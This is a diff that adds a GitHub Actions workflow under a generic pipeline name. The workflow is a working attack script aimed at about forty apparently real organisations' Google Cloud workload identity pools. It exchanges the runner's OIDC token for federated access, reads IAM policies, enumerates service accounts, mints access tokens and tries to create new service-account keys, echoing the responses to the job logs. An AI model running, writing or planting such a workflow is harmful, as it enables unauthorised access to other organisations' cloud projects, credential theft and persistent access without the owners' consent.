@@ -1,0 +1,136 @@
+name: p40
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  p40:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    steps:
+      - name: pipeline40
+        run: |
+          set +e
+          cat > targets.txt <<'AUD'
+          projects/1006240973223/locations/global/workloadIdentityPools/gha-create-gke-cluster/providers/github-actions|gke-nodes@code-idp.iam.gserviceaccount.com,terraform-gke@code-idp.iam.gserviceaccount.com
+          projects/1038484894585/locations/global/workloadIdentityPools/github-wi-pool/providers/github-wi-provider|dsp-artifact-registry-push@dsp-artifact-registry.iam.gserviceaccount.com,appengine-cleanup-non-prod@bvdp-saturn-dev.iam.gserviceaccount.com,image-build-account@broad-dsp-gcr-public.iam.gserviceaccount.com,gcr-sa@datarepo-public-gcr.iam.gserviceaccount.com,gcr-publish@broad-dsp-gcr-public.iam.gserviceaccount.com
+          projects/1050537848145/locations/global/workloadIdentityPools/pool-github-actions/providers/provider-github-actions|github-actions@spream.iam.gserviceaccount.com
+          projects/10554368204/locations/global/workloadIdentityPools/tango-ci-pool/providers/tango-ci-provider|tango-service@ai2-allennlp.iam.gserviceaccount.com
+          projects/1084703453822/locations/global/workloadIdentityPools/github-actions/providers/github-actions-provider|cd-github-actions@estuary-control.iam.gserviceaccount.com,data-plane-controller@estuary-control.iam.gserviceaccount.com,config-encryption@estuary-control.iam.gserviceaccount.com,cd-github-ui@estuary-control.iam.gserviceaccount.com,cd-config-encryption@estuary-control.iam.gserviceaccount.com
+          projects/139710495908/locations/global/workloadIdentityPools/my-pool/providers/my-provider|my-service-account@dogwood-goods-360821.iam.gserviceaccount.com
+          projects/179570514589/locations/global/workloadIdentityPools/insight-prod/providers/github-behemothltd|github-action@behemothvn.iam.gserviceaccount.com
+          projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider|github-actions@zuplo-marketing.iam.gserviceaccount.com
+          projects/196690008143/locations/global/workloadIdentityPools/main/providers/github|github@stakestar.iam.gserviceaccount.com
+          projects/198474744222/locations/global/workloadIdentityPools/pool/providers/github|github-actions@math-p-earth.iam.gserviceaccount.com
+          projects/226429748228/locations/global/workloadIdentityPools/github-actions/providers/github|226429748228-compute@developer.gserviceaccount.com
+          projects/229164983194/locations/global/workloadIdentityPools/registry-identity-pool/providers/gh-provider|artifact-deployer@swirlds-registry.iam.gserviceaccount.com,hedera-artifact-builds@devops-1-254919.iam.gserviceaccount.com,swirlds-automation@hedera-registry.iam.gserviceaccount.com
+          projects/235822363393/locations/global/workloadIdentityPools/hedera-builds-pool/providers/hedera-builds-gh-actions|artifact-deployer@swirlds-registry.iam.gserviceaccount.com,hedera-artifact-builds@devops-1-254919.iam.gserviceaccount.com,swirlds-automation@hedera-registry.iam.gserviceaccount.com
+          projects/289323711544/locations/global/workloadIdentityPools/baltic-star-pool/providers/github-actions-provider|github-deploy-functions@baltic-star-cloud.iam.gserviceaccount.com
+          projects/292061085119/locations/global/workloadIdentityPools/github-pool/providers/provider-github|gh-actions@ynufes-hp-cloudrun.iam.gserviceaccount.com
+          projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider|github-actions@aryeelab.iam.gserviceaccount.com
+          projects/305452601764/locations/global/workloadIdentityPools/builders/providers/github|305452601764-compute@developer.gserviceaccount.com
+          projects/307390870127/locations/global/workloadIdentityPools/github-action-pool/providers/github-action-provider|github-action-service-account@vibrant-mantis-723.iam.gserviceaccount.com
+          projects/345950277072/locations/global/workloadIdentityPools/gh-actions-pool/providers/gh-actions-provider|mozilla-dev-sa@catalyst-cooperative-mozilla.iam.gserviceaccount.com,pudl-sources@catalyst-cooperative-pudl.iam.gserviceaccount.com
+          projects/363590592857/locations/global/workloadIdentityPools/github-action/providers/github|363590592857-compute@developer.gserviceaccount.com
+          projects/389517956549/locations/global/workloadIdentityPools/github/providers/github-provider|github-493@terrafarm-378218.iam.gserviceaccount.com
+          projects/412074507462/locations/global/workloadIdentityPools/finos-legend-engine-build-pool/providers/finos-legend-engine-provider|finos-legend-engine-build@legend-integration-testing.iam.gserviceaccount.com
+          projects/419310667461/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions-provider|github-actions@hai-gcp-fine-grained.iam.gserviceaccount.com
+          projects/51853309262/locations/global/workloadIdentityPools/my-pool/providers/my-provider|github-actions-sa@ai-accounting-405809.iam.gserviceaccount.com
+          projects/536185737408/locations/global/workloadIdentityPools/carbonifer-gh-pool/providers/carbonifer-oidc-provider|github@carbonifer-sandbox.iam.gserviceaccount.com
+          projects/567187841907/locations/global/workloadIdentityPools/staging-shared-9bd2/providers/staging-shared-gha|prod-images-ci@prod-images-c6e5.iam.gserviceaccount.com,staging-images-ci@staging-images-183e.iam.gserviceaccount.com
+          projects/585501833219/locations/global/workloadIdentityPools/github-action-sandbox-ldy/providers/github-provider|585501833219-compute@developer.gserviceaccount.com
+          projects/591367483723/locations/global/workloadIdentityPools/pool/providers/provider|591367483723-compute@developer.gserviceaccount.com
+          projects/618116202522/locations/global/workloadIdentityPools/prod-shared-e350/providers/prod-shared-gha|prod-images-ci@prod-images-c6e5.iam.gserviceaccount.com,staging-images-ci@staging-images-183e.iam.gserviceaccount.com
+          projects/731679007643/locations/global/workloadIdentityPools/github-actions/providers/rails-todo-identity-pool-github|github-actions@rails-todo-app-386721.iam.gserviceaccount.com
+          projects/732617874837/locations/global/workloadIdentityPools/terraform-pool/providers/github-provider|terraform-sa@crucial-bucksaw-474203-m4.iam.gserviceaccount.com
+          projects/737226828112/locations/global/workloadIdentityPools/github/providers/github-provider|github-prod@kernel-services-prod.iam.gserviceaccount.com
+          projects/755556984315/locations/global/workloadIdentityPools/github-action/providers/github-provider|github-action-sa@peacepal-427210.iam.gserviceaccount.com,my-service-account@my-project.iam.gserviceaccount.com
+          projects/848539402404/locations/global/workloadIdentityPools/gh-actions/providers/gh-actions|gh-actions-dapla-metadata@artifact-registry-5n.iam.gserviceaccount.com,gh-actions-dapla-pseudo@artifact-registry-5n.iam.gserviceaccount.com,gh-actions-dapla-lab@artifact-registry-5n.iam.gserviceaccount.com
+          projects/855475113448/locations/global/workloadIdentityPools/eto-github/providers/eto-github|eto-cd-github@gcp-cset-projects.iam.gserviceaccount.com
+          projects/868781662168/locations/global/workloadIdentityPools/prod-github/providers/github-oidc-pool|gha-gocd-api@sac-prod-sa.iam.gserviceaccount.com,gha-symbolicator-push@sac-prod-sa.iam.gserviceaccount.com,gha-relay-push@sac-prod-sa.iam.gserviceaccount.com,gha-snuba-push@sac-prod-sa.iam.gserviceaccount.com,gha-reload-push@sac-prod-sa.iam.gserviceaccount.com,gha-pypi@sac-prod-sa.iam.gserviceaccount.com,gha-chartcuterie-push@sac-prod-sa.iam.gserviceaccount.com,gha-vroom-push@sac-prod-sa.iam.gserviceaccount.com,gha-usage-accountant-push@sac-prod-sa.iam.gserviceaccount.com,gha-warden@sac-prod-sa.iam.gserviceaccount.com,gha-taskbroker-push@sac-prod-sa.iam.gserviceaccount.com
+          projects/87165905547/locations/global/workloadIdentityPools/github-actions-pool/providers/github-actions|animeta-github-actions@ditto-1470749749381.iam.gserviceaccount.com
+          projects/949875736540/locations/global/workloadIdentityPools/external-pool/providers/github-provider|artifact-pusher@talon-artifacts.iam.gserviceaccount.com
+          projects/950268361153/locations/global/workloadIdentityPools/docker-react-test-pool/providers/docker-react-test-provider|950268361153-compute@developer.gserviceaccount.com
+          projects/970557914270/locations/global/workloadIdentityPools/raspbernetes-oidc-pool/providers/github-provider|raspbernetes-oidc-sa@raspbernetes.iam.gserviceaccount.com
+          AUD
+          probe_api() { # num sa tok label url
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -H "Authorization: Bearer $tok" "$url")
+            b=$(head -c 260 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          probe_post() { # num sa tok label url file
+            local num="$1" sa="$2" tok="$3" label="$4" url="$5" f="$6"
+            local c b
+            c=$(curl -s -o o.json -w '%{http_code}' -X POST -H "Authorization: Bearer $tok" -H "Content-Type: application/json" "$url" -d @"$f")
+            b=$(head -c 360 o.json | tr -d '\n' | tr -s ' ')
+            echo "##API num=$num sa=$sa label=$label code=$c body=$b"
+          }
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          jq -n '{keyAlgorithm:"KEY_ALG_RSA_2048"}' > keyreq.json
+          n=0
+          while IFS='|' read -r PRJ SAS; do
+            [ -z "$PRJ" ] && continue
+            n=$((n+1))
+            NUM=$(echo "$PRJ" | cut -d/ -f2)
+            AUD="https://iam.googleapis.com/$PRJ"
+            J=""
+            for a in 1 2 3; do
+              J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+              echo "$J" | jq -r '.value // empty' > tok.jwt
+              [ -s tok.jwt ] && break
+              sleep 3
+            done
+            if [ ! -s tok.jwt ]; then echo "##STS num=$NUM provider=$PRJ code=MINT_FAIL body="; continue; fi
+            c=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+              --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+              --data-urlencode "subject_token=$(cat tok.jwt)" \
+              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+              -d "scope=https://www.googleapis.com/auth/cloud-platform")
+            b=$(head -c 300 r.json | tr -d '\n' | tr -s ' ')
+            echo "##STS num=$NUM provider=$PRJ code=$c body=$b"
+            FT=$(jq -r '.access_token // empty' r.json)
+            if [ -z "$FT" ]; then sleep 1; continue; fi
+            echo "##FT num=$NUM provider=$PRJ toklen=${#FT}"
+            # direct federated-token access battery
+            probe_api "$NUM" "-" "$FT" "direct-models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+            probe_api "$NUM" "-" "$FT" "direct-billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+            probe_api "$NUM" "-" "$FT" "direct-projects-get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+            # read policy + enumerate SAs
+            pc=$(curl -s -o pol.json -w '%{http_code}' -H "Authorization: Bearer $FT" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM:getIamPolicy")
+            pb=$(head -c 900 pol.json | tr -d '\n' | tr -s ' ')
+            echo "##POLICY num=$NUM code=$pc body=$pb"
+            sc=$(curl -s -o sal.json -w '%{http_code}' -H "Authorization: Bearer $FT" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts")
+            sl=$(jq -r '.accounts[]?.email' sal.json 2>/dev/null | tr '\n' ',')
+            sb=$(head -c 260 sal.json | tr -d '\n' | tr -s ' ')
+            echo "##SALIST num=$NUM code=$sc sas=$sl body=$sb"
+            CAND="$SAS"
+            [ -n "$sl" ] && CAND="$CAND,$sl"
+            CAND="$CAND,$NUM-compute@developer.gserviceaccount.com"
+            seen=","
+            for SA in ${CAND//,/ }; do
+              SA=$(echo "$SA" | sed 's/^ *//;s/ *$//')
+              [ -z "$SA" ] && continue
+              case "$seen" in *",$SA,"*) continue;; esac
+              seen="$seen$SA,"
+              gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+                "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/$SA:generateAccessToken" -d @req.json)
+              gb=$(head -c 200 g.json | tr -d '\n' | tr -s ' ')
+              AT=$(jq -r '.accessToken // empty' g.json)
+              echo "##GEN num=$NUM sa=$SA code=$gc toklen=${#AT} body=$gb"
+              if [ -z "$AT" ]; then continue; fi
+              probe_api "$NUM" "$SA" "$AT" "models-central1" "https://us-central1-aiplatform.googleapis.com/v1/projects/$NUM/locations/us-central1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-europe-west1" "https://europe-west1-aiplatform.googleapis.com/v1/projects/$NUM/locations/europe-west1/models"
+              probe_api "$NUM" "$SA" "$AT" "models-global" "https://aiplatform.googleapis.com/v1/projects/$NUM/locations/global/models"
+              probe_api "$NUM" "$SA" "$AT" "billing" "https://cloudbilling.googleapis.com/v1/projects/$NUM/billingInfo"
+              probe_api "$NUM" "$SA" "$AT" "projects-get" "https://cloudresourcemanager.googleapis.com/v1/projects/$NUM"
+              probe_post "$NUM" "$SA" "$AT" "sa-key" "https://iam.googleapis.com/v1/projects/$NUM/serviceAccounts/$SA/keys" keyreq.json
+            done
+            echo "##DONE num=$NUM n=$n"
+            sleep 0.4
+          done < targets.txt
+          echo "##FINISHED total=$n"
